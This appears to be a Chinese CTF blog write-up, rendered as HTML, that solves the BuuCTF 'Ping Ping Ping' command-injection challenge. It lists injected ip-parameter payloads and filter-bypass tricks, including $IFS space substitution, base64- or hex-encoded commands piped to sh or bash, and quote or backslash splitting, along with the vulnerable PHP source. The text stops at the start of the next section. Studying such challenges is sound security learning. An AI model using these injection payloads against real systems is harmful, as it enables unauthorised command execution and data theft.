@@ -1,0 +1,1372 @@
+
+<!doctype html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      <link rel="shortcut icon" href="../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.1.2, mkdocs-material-6.1.0">
+    
+    
+      
+        <title>buuctf-web题练习2 - Lukhap's Blog</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.bc7e593a.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.ab28b872.min.css">
+        
+          
+          
+          <meta name="theme-color" content="#546d78">
+        
+      
+    
+    
+    
+      
+        
+        <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700%7CRoboto+Mono&display=fallback">
+        <style>body,input{font-family:"Roboto",-apple-system,BlinkMacSystemFont,Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Roboto Mono",SFMono-Regular,Consolas,Menlo,monospace}</style>
+      
+    
+    
+    
+    
+      
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="" data-md-color-primary="blue-grey" data-md-color-accent="pink">
+      
+  
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#buuctf-web-1" class="md-skip">
+          跳转至
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header-nav md-grid" aria-label="Header">
+    <a href="../../.." title="Lukhap&#39;s Blog" class="md-header-nav__button md-logo" aria-label="Lukhap's Blog">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 003-3 3 3 0 00-3-3 3 3 0 00-3 3 3 3 0 003 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg>
+
+    </a>
+    <label class="md-header-nav__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg>
+    </label>
+    <div class="md-header-nav__title" data-md-component="header-title">
+      
+        <div class="md-header-nav__ellipsis">
+          <span class="md-header-nav__topic md-ellipsis">
+            Lukhap's Blog
+          </span>
+          <span class="md-header-nav__topic md-ellipsis">
+            
+              buuctf-web题练习2
+            
+          </span>
+        </div>
+      
+    </div>
+    
+      <label class="md-header-nav__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+      </label>
+      
+<div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" data-md-state="active">
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+      </label>
+      <button type="reset" class="md-search__icon md-icon" aria-label="Clear" data-md-component="search-reset" tabindex="-1">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg>
+      </button>
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+
+  
+
+<nav class="md-tabs md-tabs--active" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-tabs__inner md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  <li class="md-tabs__item">
+    
+      <a href="../../.." class="md-tabs__link">
+        Home
+      </a>
+    
+  </li>
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../../hub/HTB-Blunder/" class="md-tabs__link">
+          靶场
+        </a>
+      
+    </li>
+  
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../../web/%E6%96%87%E4%BB%B6%E7%9A%84%E5%8C%85%E5%90%AB%E7%9A%84%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF/" class="md-tabs__link">
+          web安全
+        </a>
+      
+    </li>
+  
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../../vulns/avms/avms_bypass/" class="md-tabs__link">
+          漏洞
+        </a>
+      
+    </li>
+  
+
+      
+        
+  
+  
+    
+    
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../pwn/%E6%A0%88%E5%9F%BA%E7%A1%80/" class="md-tabs__link">
+          CTF
+        </a>
+      
+    </li>
+  
+
+  
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../../python/re%E7%9A%84%E5%87%A0%E7%A7%8D%E7%94%A8%E6%B3%95/" class="md-tabs__link">
+          Python
+        </a>
+      
+    </li>
+  
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../../tunnel/隐蔽隧道.md" class="md-tabs__link">
+          后渗透
+        </a>
+      
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../.." title="Lukhap&#39;s Blog" class="md-nav__button md-logo" aria-label="Lukhap's Blog">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 003-3 3 3 0 00-3-3 3 3 0 00-3 3 3 3 0 003 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg>
+
+    </a>
+    Lukhap's Blog
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href="../../.." class="md-nav__link">
+      Home
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2">
+    
+    <label class="md-nav__link" for="nav-2">
+      靶场
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="靶场" data-md-level="1">
+      <label class="md-nav__title" for="nav-2">
+        <span class="md-nav__icon md-icon"></span>
+        靶场
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../hub/HTB-Blunder/" class="md-nav__link">
+      HackTheBox Blunder靶机
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../hub/HTB-Admirer/" class="md-nav__link">
+      HackTheBox Admirer靶机
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../hub/HTB-Luanne/" class="md-nav__link">
+      HackTheBox Luanne靶机
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../hub/HTB-Academy/" class="md-nav__link">
+      HackTheBox Academy靶机
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../hub/VulnStack-1/" class="md-nav__link">
+      VulnStack靶机(一)
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3" type="checkbox" id="nav-3">
+    
+    <label class="md-nav__link" for="nav-3">
+      web安全
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="web安全" data-md-level="1">
+      <label class="md-nav__title" for="nav-3">
+        <span class="md-nav__icon md-icon"></span>
+        web安全
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../web/%E6%96%87%E4%BB%B6%E7%9A%84%E5%8C%85%E5%90%AB%E7%9A%84%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF/" class="md-nav__link">
+      文件包含
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-4" type="checkbox" id="nav-4">
+    
+    <label class="md-nav__link" for="nav-4">
+      漏洞
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="漏洞" data-md-level="1">
+      <label class="md-nav__title" for="nav-4">
+        <span class="md-nav__icon md-icon"></span>
+        漏洞
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../vulns/avms/avms_bypass/" class="md-nav__link">
+      avms系统登录绕过
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-5" type="checkbox" id="nav-5" checked>
+    
+    <label class="md-nav__link" for="nav-5">
+      CTF
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="CTF" data-md-level="1">
+      <label class="md-nav__title" for="nav-5">
+        <span class="md-nav__icon md-icon"></span>
+        CTF
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-5-1" type="checkbox" id="nav-5-1">
+    
+    <label class="md-nav__link" for="nav-5-1">
+      PWN
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="PWN" data-md-level="2">
+      <label class="md-nav__title" for="nav-5-1">
+        <span class="md-nav__icon md-icon"></span>
+        PWN
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../pwn/%E6%A0%88%E5%9F%BA%E7%A1%80/" class="md-nav__link">
+      栈基础
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-5-2" type="checkbox" id="nav-5-2" checked>
+    
+    <label class="md-nav__link" for="nav-5-2">
+      Web
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="Web" data-md-level="2">
+      <label class="md-nav__title" for="nav-5-2">
+        <span class="md-nav__icon md-icon"></span>
+        Web
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../2019-%E5%BC%BA%E7%BD%91%E6%9D%AF-%E9%9A%8F%E4%BE%BF%E6%B3%A8/" class="md-nav__link">
+      2019-强网杯-随便注
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../buuctf-excrcise/" class="md-nav__link">
+      buuctf-web题练习1
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active">
+    
+    <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+    
+      
+    
+    
+      <label class="md-nav__link md-nav__link--active" for="__toc">
+        buuctf-web题练习2
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+    
+    <a href="./" class="md-nav__link md-nav__link--active">
+      buuctf-web题练习2
+    </a>
+    
+      
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#1-gxyctf2019-ping-ping-ping" class="md-nav__link">
+    1 GXYCTF2019 Ping Ping Ping
+  </a>
+  
+    <nav class="md-nav" aria-label="1 GXYCTF2019 Ping Ping Ping">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    命令联合执行
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    命令执行绕过空格
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    内联执行
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    命令执行其他绕过
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#bashsh" class="md-nav__link">
+    过滤的bash用sh+管道替换
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    类似答题解题思路
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ifs1indexphp" class="md-nav__link">
+    利用$IFS$1绕过空格，可以读取index.php
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    从源码可得被过滤的字符串和符号
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    方法一：变量替换
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#shbash" class="md-nav__link">
+    方法二：sh替换bash
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    方法三：内联执行
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-actf2020-exec" class="md-nav__link">
+    2 ACTF2020 新生赛 Exec
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-2018-easy_tornado" class="md-nav__link">
+    3 护网杯 2018 easy_tornado
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4-2019-knife" class="md-nav__link">
+    4 极客大挑战 2019 Knife
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#5-roarctf-2019-easy-calc" class="md-nav__link">
+    5 RoarCTF 2019 Easy Calc
+  </a>
+  
+    <nav class="md-nav" aria-label="5 RoarCTF 2019 Easy Calc">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#2-contentval" class="md-nav__link">
+    知识点2 $("#content").val() ：
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-php" class="md-nav__link">
+    知识点2 PHP的字符串解析特性
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-scandir" class="md-nav__link">
+    知识点3 scandir()
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#php" class="md-nav__link">
+    方法一：利用php解析特性
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#http" class="md-nav__link">
+    方法二：http走私
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+    
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../buuctf-excrcise3/" class="md-nav__link">
+      buuctf-web题练习3
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-6" type="checkbox" id="nav-6">
+    
+    <label class="md-nav__link" for="nav-6">
+      Python
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="Python" data-md-level="1">
+      <label class="md-nav__title" for="nav-6">
+        <span class="md-nav__icon md-icon"></span>
+        Python
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../python/re%E7%9A%84%E5%87%A0%E7%A7%8D%E7%94%A8%E6%B3%95/" class="md-nav__link">
+      re的几种用法
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-7" type="checkbox" id="nav-7">
+    
+    <label class="md-nav__link" for="nav-7">
+      后渗透
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="后渗透" data-md-level="1">
+      <label class="md-nav__title" for="nav-7">
+        <span class="md-nav__icon md-icon"></span>
+        后渗透
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../tunnel/隐蔽隧道.md" class="md-nav__link">
+      隐蔽隧道
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#1-gxyctf2019-ping-ping-ping" class="md-nav__link">
+    1 GXYCTF2019 Ping Ping Ping
+  </a>
+  
+    <nav class="md-nav" aria-label="1 GXYCTF2019 Ping Ping Ping">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    命令联合执行
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    命令执行绕过空格
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    内联执行
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    命令执行其他绕过
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#bashsh" class="md-nav__link">
+    过滤的bash用sh+管道替换
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    类似答题解题思路
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ifs1indexphp" class="md-nav__link">
+    利用$IFS$1绕过空格，可以读取index.php
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    从源码可得被过滤的字符串和符号
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    方法一：变量替换
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#shbash" class="md-nav__link">
+    方法二：sh替换bash
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    方法三：内联执行
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-actf2020-exec" class="md-nav__link">
+    2 ACTF2020 新生赛 Exec
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-2018-easy_tornado" class="md-nav__link">
+    3 护网杯 2018 easy_tornado
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4-2019-knife" class="md-nav__link">
+    4 极客大挑战 2019 Knife
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#5-roarctf-2019-easy-calc" class="md-nav__link">
+    5 RoarCTF 2019 Easy Calc
+  </a>
+  
+    <nav class="md-nav" aria-label="5 RoarCTF 2019 Easy Calc">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#2-contentval" class="md-nav__link">
+    知识点2 $("#content").val() ：
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-php" class="md-nav__link">
+    知识点2 PHP的字符串解析特性
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-scandir" class="md-nav__link">
+    知识点3 scandir()
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#php" class="md-nav__link">
+    方法一：利用php解析特性
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#http" class="md-nav__link">
+    方法二：http走私
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content">
+            <article class="md-content__inner md-typeset">
+              
+                
+                
+                <h1 id="buuctf-web-1">BuuCTF Web类型题练习 1<a class="headerlink" href="#buuctf-web-1" title="Permanent link">&para;</a></h1>
+<h2 id="1-gxyctf2019-ping-ping-ping">1 GXYCTF2019 Ping Ping Ping<a class="headerlink" href="#1-gxyctf2019-ping-ping-ping" title="Permanent link">&para;</a></h2>
+<p>根据提示，可判断应该是考命令注入 ，输入  <code>?ip=127.0.0.1|id</code>    <code>?ip=127.0.0.1|ls</code></p>
+<p><img alt="image-20210119000810738" src="../images/buuctf-excrcise2/image-20210119000810738.png" /></p>
+<p><img alt="image-20210119193509685" src="../images/buuctf-excrcise2/image-20210119193509685.png" /></p>
+<h4 id="_1">命令联合执行<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code>;     前面的执行完执行后面的
+|     管道符，上一条命令的输出，作为下一条命令的参数（显示后面的执行结果）         
+||    当前面的执行出错时（为假）执行后面的
+&amp;     将任务置于后台执行
+&amp;&amp;    前面的语句为假则直接出错，后面的也不执行，前面只能为真
+%0a  （换行）
+%0d  （回车）
+</code></pre></div>
+<h4 id="_2">命令执行绕过空格<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code>${IFS}$9
+{IFS}
+$IFS
+${IFS}
+$IFS$1 //$1改成$加其他数字貌似都行
+IFS
+&lt; 
+&lt;&gt; 
+{cat,flag.php}  //用逗号实现了空格功能，需要用{}括起来
+%20   (space)
+%09   (tab)
+X=$&#39;cat\x09./flag.php&#39;;$X       （\x09表示tab，也可以用\x20）
+</code></pre></div>
+<p>ps:有时会禁用cat: 解决方法是使用tac反向输出命令： linux命令中可以加\，所以甚至可以ca\t /fl\ag</p>
+<h4 id="_3">内联执行<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code>?ip=127.0.0.1;cat$IFS$9`ls`
+
+$IFS在Linux下表示为空格
+$9是当前系统shell进程第九个参数持有者，始终为空字符串，$后可以接任意数字
+
+这里$IFS$9或$IFS垂直，后面加个$与{}类似，起截断作用
+</code></pre></div>
+<h4 id="_4">命令执行其他绕过<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code>1.cat fl* 利用*匹配任意 
+2.echo &quot;Y2F0IGZsYWcucGhw&quot;| base64 -d | bash 
+3.ca\t fl\ag.php 
+4.cat fl&#39;&#39;ag.php 
+</code></pre></div>
+<h4 id="bashsh">过滤的bash用sh+管道替换<a class="headerlink" href="#bashsh" title="Permanent link">&para;</a></h4>
+<p><code>?ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</code></p>
+<h4 id="_5">类似答题解题思路<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code>cat fl*  用*匹配任意 
+cat fla* 用*匹配任意
+ca\t fla\g.php        反斜线绕过
+cat fl&#39;&#39;ag.php        两个单引号绕过
+echo &quot;Y2F0IGZsYWcucGhw&quot; | base64 -d | bash      
+//base64编码绕过(引号可以去掉)  |(管道符) 会把前一个命令的输出作为后一个命令的参数
+
+echo &quot;63617420666c61672e706870&quot; | xxd -r -p | bash       
+//hex编码绕过(引号可以去掉)
+
+echo &quot;63617420666c61672e706870&quot; | xxd -r -p | sh     
+//sh的效果和bash一样
+
+cat fl[a]g.php       用[]匹配
+
+a=fl;b=ag;cat $a$b          变量替换
+cp fla{g.php,G}    把flag.php复制为flaG
+ca${21}t a.txt     利用空变量  使用$*和$@，$x(x 代表 1-9),${x}(x&gt;=10)(小于 10 也是可以的) 因为在没有传参的情况下，上面的特殊变量都是为空的 
+</code></pre></div>
+<p>通配符</p>
+<div class="highlight"><pre><span></span><code>*     #匹配全部字符，通配符
+?    #任意一个字符，通配符
+[]      #表示一个范围（正则，通配符）
+{}      #产生一个序列（通配符）
+</code></pre></div>
+<h4 id="ifs1indexphp">利用$IFS$1绕过空格，可以读取index.php<a class="headerlink" href="#ifs1indexphp" title="Permanent link">&para;</a></h4>
+<p><code>?ip=127.0.0.1|cat$IFS$1index.php</code></p>
+<div class="highlight"><pre><span></span><code>/?ip=
+
+/?ip=
+|\&#39;|\&quot;|\\|\(|\)|\[|\]|\{|\}/&quot;, $ip, $match)){
+    echo preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x{00}-\x{20}]|\&gt;|\&#39;|\&quot;|\\|\(|\)|\[|\]|\{|\}/&quot;, $ip, $match);
+    die(&quot;fxck your symbol!&quot;);
+  } else if(preg_match(&quot;/ /&quot;, $ip)){
+    die(&quot;fxck your space!&quot;);
+  } else if(preg_match(&quot;/bash/&quot;, $ip)){
+    die(&quot;fxck your bash!&quot;);
+  } else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip)){
+    die(&quot;fxck your flag!&quot;);
+  }
+  $a = shell_exec(&quot;ping -c 4 &quot;.$ip);
+  echo &quot;
+
+&quot;;
+  print_r($a);
+}
+
+?&gt;
+</code></pre></div>
+<h4 id="_6">从源码可得被过滤的字符串和符号<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code>&amp; / ？ * &lt; x{00}-\x{1f} &#39; &quot; \ () [] {}  空格
+&quot;xxxfxxxlxxxaxxxgxxx&quot;      顺序出现flag四个字符
+&quot; &quot; &quot;bash&quot; 
+</code></pre></div>
+<h4 id="_7">方法一：变量替换<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h4>
+<p><code>?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php</code></p>
+<p><code>?ip=127.0.0.1;a=g;b=fla;cat$IFS$1$b$a.php</code></p>
+<p><img alt="image-20210119220230306" src="../images/buuctf-excrcise2/image-20210119220230306.png" /></p>
+<p><img alt="image-20210119220417232" src="../images/buuctf-excrcise2/image-20210119220417232.png" /></p>
+<h4 id="shbash">方法二：sh替换bash<a class="headerlink" href="#shbash" title="Permanent link">&para;</a></h4>
+<p>base64:</p>
+<p><code>?ip=127.0.0.1|echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</code></p>
+<p><img alt="image-20210119214308139" src="../images/buuctf-excrcise2/image-20210119214308139.png" /></p>
+<h4 id="_8">方法三：内联执行<a class="headerlink" href="#_8" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code>?ip=127.0.0.1|cat$IFS$1`ls`
+</code></pre></div>
+<p><img alt="image-20210119215802053" src="../images/buuctf-excrcise2/image-20210119215802053.png" /></p>
+<h2 id="2-actf2020-exec">2 ACTF2020 新生赛 Exec<a class="headerlink" href="#2-actf2020-exec" title="Permanent link">&para;</a></h2>
+<p>访问后输入127.0.01提交抓包</p>
